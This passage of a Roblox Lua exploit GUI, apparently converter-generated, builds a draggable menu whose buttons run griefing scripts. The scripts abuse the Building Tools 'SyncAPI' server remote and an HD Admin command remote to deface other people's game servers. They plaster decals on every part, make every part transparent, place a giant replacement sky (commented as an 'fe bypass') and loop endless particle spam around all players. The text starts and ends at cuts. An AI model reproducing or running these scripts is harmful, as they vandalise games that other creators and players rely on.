G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["3c"] = Instance.new("TextButton", G2L["4"]);
G2L["3c"]["TextWrapped"] = true;
G2L["3c"]["BorderSizePixel"] = 3;
G2L["3c"]["TextSize"] = 14;
G2L["3c"]["TextScaled"] = true;
G2L["3c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3c"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["3c"]["Text"] = [[OLDF3X (DECAL]];
G2L["3c"]["Position"] = UDim2.new(0.04524, 0, 0.47836, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["3d"] = Instance.new("LocalScript", G2L["3c"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["3e"] = Instance.new("TextButton", G2L["4"]);
G2L["3e"]["TextWrapped"] = true;
G2L["3e"]["BorderSizePixel"] = 3;
G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextScaled"] = true;
G2L["3e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["3e"]["Text"] = [[RoadBlox GUI]];
G2L["3e"]["Position"] = UDim2.new(0.04524, 0, 0.52371, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["40"] = Instance.new("TextButton", G2L["4"]);
G2L["40"]["TextWrapped"] = true;
G2L["40"]["BorderSizePixel"] = 3;
G2L["40"]["TextSize"] = 14;
G2L["40"]["TextScaled"] = true;
G2L["40"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["40"]["Size"] = UDim2.new(0, 129, 0, 24);
G2L["40"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["40"]["Text"] = [[Flashing Sky]];
G2L["40"]["Position"] = UDim2.new(0.04263, 0, 0.67255, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["42"] = Instance.new("TextButton", G2L["4"]);
G2L["42"]["TextWrapped"] = true;
G2L["42"]["BorderSizePixel"] = 3;
G2L["42"]["TextSize"] = 14;
G2L["42"]["TextScaled"] = true;
G2L["42"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["42"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["42"]["Text"] = [[Namelesss Admin]];
G2L["42"]["Position"] = UDim2.new(0.58832, 0, 0.52604, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["43"] = Instance.new("LocalScript", G2L["42"]);



-- StarterGui.ScreenGui.Frame.ImageLabel
G2L["44"] = Instance.new("ImageLabel", G2L["2"]);
G2L["44"]["BorderSizePixel"] = 2;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Image"] = [[rbxassetid://102019111197425]];
G2L["44"]["Size"] = UDim2.new(0, 83, 0, 80);
G2L["44"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["Position"] = UDim2.new(-0.2733, 0, 0.22965, 0);


-- StarterGui.ScreenGui.Frame.ImageLabel
G2L["45"] = Instance.new("ImageLabel", G2L["2"]);
G2L["45"]["BorderSizePixel"] = 2;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Image"] = [[rbxassetid://113455072164836]];
G2L["45"]["Size"] = UDim2.new(0, 85, 0, 82);
G2L["45"]["BorderColor3"] = Color3.fromRGB(255, 152, 7);
G2L["45"]["Position"] = UDim2.new(-0.27154, 0, 0.00804, 0);


-- StarterGui.ScreenGui.Frame.page frames
G2L["46"] = Instance.new("Frame", G2L["2"]);
G2L["46"]["BorderSizePixel"] = 4;
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["Size"] = UDim2.new(0, 107, 0, 428);
G2L["46"]["Position"] = UDim2.new(1, 0, -0.00233, 0);
G2L["46"]["BorderColor3"] = Color3.fromRGB(255, 141, 9);
G2L["46"]["Name"] = [[page frames]];


-- StarterGui.ScreenGui.Frame.page frames.page2
G2L["47"] = Instance.new("TextButton", G2L["46"]);
G2L["47"]["TextWrapped"] = true;
G2L["47"]["BorderSizePixel"] = 2;
G2L["47"]["TextSize"] = 14;
G2L["47"]["TextScaled"] = true;
G2L["47"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["47"]["Size"] = UDim2.new(0, 106, 0, 53);
G2L["47"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["47"]["Text"] = [[Page 2]];
G2L["47"]["Name"] = [[page2]];
G2L["47"]["Position"] = UDim2.new(-0.00044, 0, 0.22955, 0);


-- StarterGui.ScreenGui.Frame.page frames.page2.LocalScript
G2L["48"] = Instance.new("LocalScript", G2L["47"]);



-- StarterGui.ScreenGui.Frame.page frames.pg4
G2L["49"] = Instance.new("TextButton", G2L["46"]);
G2L["49"]["TextWrapped"] = true;
G2L["49"]["BorderSizePixel"] = 3;
G2L["49"]["TextSize"] = 14;
G2L["49"]["TextScaled"] = true;
G2L["49"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["Size"] = UDim2.new(0, 106, 0, 48);
G2L["49"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["49"]["Text"] = [[Page 4]];
G2L["49"]["Name"] = [[pg4]];
G2L["49"]["Position"] = UDim2.new(-0.00251, 0, 0.11755, 0);


-- StarterGui.ScreenGui.Frame.page frames.pg4.LocalScript
G2L["4a"] = Instance.new("LocalScript", G2L["49"]);



-- StarterGui.ScreenGui.Frame.page frames.pag3
G2L["4b"] = Instance.new("TextButton", G2L["46"]);
G2L["4b"]["TextWrapped"] = true;
G2L["4b"]["BorderSizePixel"] = 3;
G2L["4b"]["TextSize"] = 14;
G2L["4b"]["TextScaled"] = true;
G2L["4b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4b"]["Size"] = UDim2.new(0, 107, 0, 41);
G2L["4b"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["4b"]["Text"] = [[Page 3]];
G2L["4b"]["Name"] = [[pag3]];
G2L["4b"]["Position"] = UDim2.new(-0.00649, 0, 0.00666, 0);


-- StarterGui.ScreenGui.Frame.page frames.pag3.LocalScript
G2L["4c"] = Instance.new("LocalScript", G2L["4b"]);



-- StarterGui.ScreenGui.Frame.page frames.TextLabel
G2L["4d"] = Instance.new("TextLabel", G2L["46"]);
G2L["4d"]["TextWrapped"] = true;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["TextSize"] = 14;
G2L["4d"]["TextScaled"] = true;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Size"] = UDim2.new(0, 107, 0, 34);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Text"] = [[GUIS/OP]];
G2L["4d"]["Position"] = UDim2.new(-0.00298, 0, 0.358, 0);


-- StarterGui.ScreenGui.Frame.page frames.TextButton
G2L["4e"] = Instance.new("TextButton", G2L["46"]);
G2L["4e"]["TextWrapped"] = true;
G2L["4e"]["BorderSizePixel"] = 3;
G2L["4e"]["TextSize"] = 14;
G2L["4e"]["TextScaled"] = true;
G2L["4e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["Size"] = UDim2.new(0, 104, 0, 28);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["4e"]["Text"] = [[Polaria F3X]];
G2L["4e"]["Position"] = UDim2.new(-0.00991, 0, 0.46565, 0);


-- StarterGui.ScreenGui.Frame.page frames.TextButton.LocalScript
G2L["4f"] = Instance.new("LocalScript", G2L["4e"]);



-- StarterGui.ScreenGui.Frame.page frames.TextButton
G2L["50"] = Instance.new("TextButton", G2L["46"]);
G2L["50"]["TextWrapped"] = true;
G2L["50"]["BorderSizePixel"] = 3;
G2L["50"]["TextSize"] = 14;
G2L["50"]["TextScaled"] = true;
G2L["50"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["Size"] = UDim2.new(0, 104, 0, 27);
G2L["50"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["50"]["Text"] = [[Mr bean F3X]];
G2L["50"]["Position"] = UDim2.new(0.01813, 0, 0.53323, 0);


-- StarterGui.ScreenGui.Frame.page frames.TextButton.LocalScript
G2L["51"] = Instance.new("LocalScript", G2L["50"]);



-- StarterGui.ScreenGui.Frame.page frames.TextButton
G2L["52"] = Instance.new("TextButton", G2L["46"]);
G2L["52"]["TextWrapped"] = true;
G2L["52"]["BorderSizePixel"] = 3;
G2L["52"]["TextSize"] = 14;
G2L["52"]["TextScaled"] = true;
G2L["52"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["52"]["Size"] = UDim2.new(0, 104, 0, 27);
G2L["52"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["52"]["Text"] = [[Audio Logger]];
G2L["52"]["Position"] = UDim2.new(0.0205, 0, 0.60554, 0);


-- StarterGui.ScreenGui.Frame.page frames.TextButton.LocalScript
G2L["53"] = Instance.new("LocalScript", G2L["52"]);



-- StarterGui.ScreenGui.Frame.ImageLabel
G2L["54"] = Instance.new("ImageLabel", G2L["2"]);
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Image"] = [[rbxassetid://127867469062303]];
G2L["54"]["Size"] = UDim2.new(0, 85, 0, 82);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Position"] = UDim2.new(-0.27937, 0, 0.4499, 0);


-- StarterGui.ScreenGui.Frame.ImageLabel
G2L["55"] = Instance.new("ImageLabel", G2L["2"]);
G2L["55"]["BorderSizePixel"] = 2;
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Image"] = [[rbxassetid://118225202152955]];
G2L["55"]["Size"] = UDim2.new(0, 80, 0, 77);
G2L["55"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
G2L["55"]["Position"] = UDim2.new(1.31332, 0, -0.00232, 0);


-- StarterGui.ScreenGui.Frame.ImageLabel
G2L["56"] = Instance.new("ImageLabel", G2L["2"]);
G2L["56"]["BorderSizePixel"] = 2;
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Image"] = [[rbxassetid://111922262636767]];
G2L["56"]["Size"] = UDim2.new(0, 85, 0, 77);
G2L["56"]["BorderColor3"] = Color3.fromRGB(255, 239, 0);
G2L["56"]["Position"] = UDim2.new(-0.27937, 0, 0.6592, 0);


-- StarterGui.ScreenGui.Frame.ImageLabel
G2L["57"] = Instance.new("ImageLabel", G2L["2"]);
G2L["57"]["BorderSizePixel"] = 2;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Image"] = [[rbxassetid://101523305806479]];
G2L["57"]["Size"] = UDim2.new(0, 80, 0, 76);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 140, 6);
G2L["57"]["Position"] = UDim2.new(1.31332, 0, 0.2, 0);


-- StarterGui.ScreenGui.Frame.ImageLabel
G2L["58"] = Instance.new("ImageLabel", G2L["2"]);
G2L["58"]["BorderSizePixel"] = 2;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Image"] = [[rbxassetid://86375724957125]];
G2L["58"]["Size"] = UDim2.new(0, 80, 0, 75);
G2L["58"]["BorderColor3"] = Color3.fromRGB(86, 86, 86);
G2L["58"]["Position"] = UDim2.new(1.31332, 0, 0.4093, 0);


-- StarterGui.ScreenGui.Frame.LocalScript
local function C_3()
local script = G2L["3"];
	local UIS = game:GetService("UserInputService")
	local frame = script.Parent
	
	local dragging = false
	local dragInput
	local startPos
	local startFramePos
	
	local function update(input)
		local delta = input.Position - startPos
		frame.Position = UDim2.new(
			startFramePos.X.Scale,
			startFramePos.X.Offset + delta.X,
			startFramePos.Y.Scale,
			startFramePos.Y.Offset + delta.Y
		)
	end
	
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			startPos = input.Position
			startFramePos = frame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_7()
local script = G2L["7"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
		local Players = game:GetService("Players")
		local workspace = game:GetService("Workspace")
		local player = Players.LocalPlayer
	
		local function findTool()
			local char = player.Character or player.CharacterAdded:Wait()
	
			for _, v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			for _, v in ipairs(player.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
		end
	
		local tool = findTool()
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function call(a)
			return remote:InvokeServer(unpack(a))
		end
	
		-- i dont used the b2s sky function anymore, i used this instead
		local hack = workspace:FindFirstChild("E")
		if hack then
			call({ "Remove", { hack } })
		end
	
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
		task.spawn(function()
			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
		end)
	
		task.spawn(function()
			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
		end)
	
		task.spawn(function()
			call({ "CreateMeshes", { { Part = sky } } })
		end)
	
		task.spawn(function()
			call({
				"SyncMesh",
				{{
					Part = sky,
					MeshId = "rbxassetid://111891702759441",
					TextureId = "rbxassetid://100430627569836",
					Scale = Vector3.new(100999, 100999, 100999),
					VertexColor = Vector3.new(3.6, 3.6, 3.6)
				}}
			})
		end)
	
		task.spawn(function()
			call({ "SetLocked", { sky }, true })
		end)
	
		task.spawn(function()
			call({ "SetName", { sky }, "Skyl0rdSky" })
		end)
	
		task.spawn(function()
			call({ "SyncMaterial", { { Part = sky, Transparency = 0.1 } } })
		end)
	
		task.spawn(function()
			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
		end)	
		
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_7);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_9()
local script = G2L["9"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
		id = 100430627569836
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
	
		function GetPartsFromSelection(Selection)
	
			local Parts = {}
	
	
			for _, Descendant in pairs(Selection:GetDescendants()) do
	
				if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
					Parts[#Parts + 1] = Descendant
	
				end
	
			end
	
	
			-- Return parts
	
			return Parts
	
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		function SpawnDecal(side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('CreateTextures', shitass);
		end
	
		function AddDecal(texture,side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('SyncTexture', shitass);
		end
	
		SpawnDecal(Enum.NormalId.Front)
		AddDecal(id,Enum.NormalId.Front)
	
		SpawnDecal(Enum.NormalId.Back)
		AddDecal(id,Enum.NormalId.Back)
	
		SpawnDecal(Enum.NormalId.Right)
		AddDecal(id,Enum.NormalId.Right)
	
		SpawnDecal(Enum.NormalId.Left)
		AddDecal(id,Enum.NormalId.Left)
	
		SpawnDecal(Enum.NormalId.Bottom)
		AddDecal(id,Enum.NormalId.Bottom)
	
		SpawnDecal(Enum.NormalId.Top)
		AddDecal(id,Enum.NormalId.Top)
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam()
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,0))
					end)
				end
			end 
		end
		spam()
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_9);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_b()
local script = G2L["b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		local function delete(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			remote:InvokeServer(unpack(args))
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		local function particle()
			while true do
				task.wait(0.01)
	
				for _, player in ipairs(game.Players:GetPlayers()) do
					local char = player.Character
					local hum  = char and char:FindFirstChildOfClass("Humanoid")
					local hrp  = char and char:FindFirstChild("HumanoidRootPart")
					if not (hum and hum.Health > 0 and hrp) then
						continue 
					end
	
					local spawnCF = hrp.CFrame * CFrame.new(math.random(),-1.5,math.random())
	
					local heh = CFrame.new(0, -10, 0)
					local part = remote:InvokeServer("CreatePart", "Normal", heh, workspace)
					part.CanCollide = false
	
	
					local direction = Vector3.new(
						math.random(-1, 1), 
						0, 
						math.random(-1, 1)
					).Unit * 0.1
	
	
					local changeDirectionChance = 0.3
					local moveBackwardChance = 0.2
	
					spawn(function()
						spawn(function()
							SetName(part, "Particles by Skyl0rdg0ne")
						end)
						spawn(function()
							Resize(part, Vector3.new(3, 3, 0.001), spawnCF)
						end)
						spawn(function()
							SetCollision(part, false)
						end)
						spawn(function()
							SetTrans(part, 1)
						end)
						spawn(function()
							SetAnchor(true, part)
						end)
						spawn(function()
							SpawnDecal(part, Enum.NormalId.Front)
						end)
						spawn(function()
							AddDecal(part, "102019111197425", Enum.NormalId.Front)
						end)
						spawn(function()
							SpawnDecal(part, Enum.NormalId.Back)
						end)
						spawn(function()
							AddDecal(part, "102019111197425", Enum.NormalId.Back)
						end)
					end)
	
					spawn(function()
						for i = 1, 90 do
							if not part then break end
	
							if math.random() < changeDirectionChance then
								direction = Vector3.new(
									math.random(-1, 1), 
									0, 
									math.random(-1, 1)
								).Unit * 0.1
	
								if math.random() < moveBackwardChance then
									direction = -direction
								end
							end
	
	
							local riseAmount = 0.4
							local movement = Vector3.new(direction.X, riseAmount, direction.Z)
	
							local newCF = part.CFrame + movement
							Resize(part, Vector3.new(3, 3, 0.001), newCF)
							wait(0.00000001) 
						end
						if part then
							wait(9)
							delete(part)
						end
					end)
				end
			end
		end
	
	
		coroutine.wrap(particle)()
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_b);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_d()
local script = G2L["d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
